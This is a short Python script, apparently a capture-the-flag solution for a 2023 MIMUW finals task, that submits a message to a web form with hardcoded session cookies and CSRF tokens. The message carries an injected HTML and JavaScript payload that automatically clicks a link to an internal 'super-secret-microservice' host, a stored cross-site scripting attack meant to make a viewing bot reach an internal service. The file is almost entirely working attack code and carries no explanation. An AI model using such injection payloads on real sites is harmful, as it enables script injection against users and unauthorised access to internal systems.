import requests

cookies = {
    'csrftoken': 'iG6smuLee8O4A6O36ATbfjkNJv7gUSZB',
    'sessionid': 'z9y3zcmm7klsy7u7ktzq1f584qjo3sjy',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'csrftoken=iG6smuLee8O4A6O36ATbfjkNJv7gUSZB; sessionid=z9y3zcmm7klsy7u7ktzq1f584qjo3sjy',
    'Origin': 'https://web.kazet.cc:42448',
    'Pragma': 'no-cache',
    'Referer': 'https://web.kazet.cc:42448/create',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data = {
    'csrfmiddlewaretoken': 'oyEhQ43zXKU9qyoIqH8mYqOVjz9kgqFsw4Az2oED1Iy3Qu2Bm7Rn3zYySU6q08uT',
    'recipient': 'ziomek1',
    'content': '''
        <a id = "123", href=http://zad41-mimuw-finals-2023-super-secret-microservice/>123</a>
        <script>
            var link = document.getElementById("123");
            link.click();
        </script>
    ''',    
    'template': 'normal',
}

response = requests.post('https://web.kazet.cc:42448/create', cookies=cookies, headers=headers, data=data)
print(response.content)
